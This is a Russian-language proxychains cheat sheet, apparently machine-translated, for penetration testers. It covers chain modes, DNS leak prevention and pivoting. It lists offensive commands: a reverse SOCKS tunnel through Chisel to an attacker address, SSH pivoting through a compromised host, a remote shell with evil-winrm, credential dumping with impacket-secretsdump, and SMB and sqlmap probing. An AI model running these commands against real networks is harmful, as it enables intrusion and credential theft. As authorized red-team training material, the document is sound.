<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Проксичейны — полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Поворот и туннелирование">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Протоколы">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Лицензия GPLv2">
</p>

<p выравнивание="центр">
  <b>🌐 Динамически маршрутизируйте стандартные сетевые инструменты Linux CLI через многоинтервальные SOCKS и HTTP-прокси через LD_PRELOAD</b>
</p>

---

## 📋 Содержание

- [Обзор и как работают Proxychains](#-overview--how-proxychains-works)
- [Установка](#-установка)
- [Файлы конфигурации и иерархия поиска](#-configuration-files--lookup-hierarchy)
- [Объяснение режимов цепочки] (#-объяснение режимов цепочки)
  - [`dynamic_chain` (рекомендуется)](#dynamic_chain-рекомендуется)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [Предотвращение утечек DNS (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [Настройка списков прокси](#-configuring-proxy-lists)
- [Рабочие процессы поворота](#-pivoting-workflows)
  - [SSH Dynamic SOCKS Proxy (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Долото и реле Ligolo-ng SOCKS](#chisel--ligolo-ng-socks-relay)
- [Интеграция инструментов и ошибки](#-tool-integration--gotchas)
  - [Nmap с Proxychains (Почему `-sS` не работает)](#nmap-with-proxychains-why--ss-fails)
  - [Инструменты Active Directory (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и OPSEC](#-защитные-соображения--opsec)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и как работают проксичейны

**Proxychains** (современная активная версия: **Proxychains-NG** / `proxychains4`) позволяет запускать любую динамическую команду через один или несколько связанных прокси-серверов SOCKS4, SOCKS5 или HTTP(S).

Он функционирует путем предварительной загрузки специальной библиотеки перехватчиков (`libproxychains4.so`) с использованием механизма динамического компоновщика (`LD_PRELOAD`). Это перехватывает вызовы API сокетов (`connect()`, `gethostbyname()`), выполняемые целевыми приложениями, и прозрачно перенаправляет их TCP-трафик в настроенную цепочку прокси.

---

## 📥 Установка
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ Файлы конфигурации и иерархия поиска

Proxychains ищет свой файл конфигурации в следующем строгом порядке приоритета:

1. Путь установлен в переменной среды `PROXYCHAINS_CONF_FILE`.
2. Файл передается через флаг `-f` (`proxychains4 -f ./myproxy.conf <command>`).
3. `./proxychains.conf` в текущем рабочем каталоге.
4. `$(HOME)/.proxychains/proxychains.conf`.
5. `/etc/proxychains4.conf` (системное значение по умолчанию).

---

## 🔗 Объяснение режимов цепочки

Отредактируйте `/etc/proxychains4.conf`, чтобы выбрать алгоритм маршрутизации цепочки:

### `dynamic_chain` (рекомендуется)
Автоматически пропускает мертвые прокси в списке, не прерывая соединение. Если прокси-сервер №1 включен, прокси-сервер №2 отключен и прокси-сервер №3 включен, трафик проходит через 1 -> 3.
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
Строго следует настроенному порядку прокси. Если какой-либо прокси-сервер в цепочке выходит из строя или истекает время ожидания, все соединение отклоняется.
```ini
strict_chain
```
### `round_robin_chain`
Последовательно перебирает список прокси для каждого нового запроса на соединение.
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
Случайным образом выбирает прокси из списка до `chain_len`.

---

## 🛡️ Предотвращение утечек DNS (`proxy_dns`)

Одним из наиболее опасных сбоев OPSEC во время внешней разведки или внутреннего поворота является утечка DNS-запросов к локальному интернет-провайдеру или целевому шлюзу.

Убедитесь, что `proxy_dns` активен в `/etc/proxychains4.conf`:
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 Настройка списков прокси

Внизу `/etc/proxychains4.conf`, под `[ProxyList]`:
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 Поворот рабочих процессов

### SSH Динамический SOCKS-прокси (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Зубило и Ligolo-ng SOCKS Эстафета

При запуске клиент-серверных туннелей Chisel:
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ Интеграция инструментов и ошибки

### Nmap с проксичейнами (почему `-sS` не работает)

> [!ВНИМАНИЕ]
> Прокси SOCKS поддерживают только установленные сеансы TCP. **Скрытое сканирование SYN (`-sS`) завершится сбоем или зависнет**, поскольку оно требует манипуляций с необработанными сокетами, которые не поддерживаются в SOCKS!
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Инструменты Active Directory (NetExec, Evil-WinRM, Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Выполнить команду через прокси** | `proxychains4 <command> [args]` |
| **Пользовательский файл конфигурации** | `proxychains4 -f ./custom.conf <command>` |
| **Тихая казнь (без баннера)** | `proxychains4 -q <command>` |
| **Внутренняя цель TCP-сканирования** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **Внутренний веб-запрос** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **Внутренний тест SQLMap** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **Внутренний зонд NetExec** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ Оборонительные соображения и OPSEC

1. **Утечки DNS:** Если `proxy_dns` закомментирован, ваша система будет разрешать имена хостов через локальный DNS, предупреждая Blue Teams о целевых именах хостов.
2. **Скорость и задержка.** Объединение нескольких прокси-серверов увеличивает время прохождения сигнала туда и обратно (RTT). Установите разумные таймауты (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
3. **Статические двоичные файлы:** Статически скомпилированные двоичные файлы (например, двоичные файлы Go/Rust, которые не связывают `libc.so`) обходят перехватчики `LD_PRELOAD` и не перенаправляются через Proxychains.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Эта шпаргалка предназначена только для авторизованного тестирования на проникновение, участия Red Team и образовательных исследований. Маршрутизация трафика без авторизации строго запрещена.